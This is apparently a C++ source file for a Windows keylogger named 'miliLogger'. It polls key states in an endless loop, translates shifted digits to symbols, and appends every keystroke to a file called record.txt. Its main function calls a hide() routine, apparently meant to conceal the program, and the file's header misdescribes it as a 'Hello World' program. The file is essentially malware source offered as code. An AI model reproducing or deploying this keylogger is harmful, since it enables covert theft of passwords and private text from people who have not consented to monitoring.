//============================================================================
// Name        : miliLogger.cpp
// Author      : MiltonKumar
// Version     :
// Copyright   : miltonyadav@gmail.com
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>

using namespace std;

void hide();
void log(){
	char key;

		for(;;){
			for(key=8; key<=222;key++){
				if(GetAsyncKeyState(key)==-32767){
					ofstream write("record.txt",ios::app);
					//write<<c;
					if((key>=65 && key<=90)&&!(GetAsyncKeyState(0x10))){
						key=key+32;
						write<<key;
						write.close();
						break;
					}
					else if(key>=65 && key<=90){
						write<<key;
						write.close();
						break;
					}
					else{
						switch(key){
						case 49:
							if(GetAsyncKeyState(0x10)){
								write<<"!";
							}break;
						case 50:
							if(GetAsyncKeyState(0x10)){
							    write<<"@";
							}break;

						case 51:
							if(GetAsyncKeyState(0x10)){
								write<<"#";
							}break;
						case 52:
							if(GetAsyncKeyState(0x10)){
								write<<"$";
								}break;
						case 53:
							if(GetAsyncKeyState(0x10)){
								write<<"%";
							}break;
						case 54:
							if(GetAsyncKeyState(0x10)){
								write<<"^";
							}break;
						case 55:
							if(GetAsyncKeyState(0x10)){
							    write<<"&";
							}break;
						case 56:
							if(GetAsyncKeyState(0x10)){
								write<<"*";
							}break;
						case 57:
							if(GetAsyncKeyState(0x10)){
								write<<"(";
							}break;
						case 48:
							if(GetAsyncKeyState(0x10)){
								write<<")";
							}break;
							}
					}


					switch(key){
					case 8: write<<"<BackSpace>";break;
					case 9: write<<"	"; break;
					case 27: write<<"<escape>";break;
					case 127: write<<"<delete>";break;
					case 32: write<<" ";break;
					case 13: write<<"<enter>\n";break;
					default: write<<key;

					}

				}
			}
		}
}



int main() {

	hide();
	log();


	return 0;
}
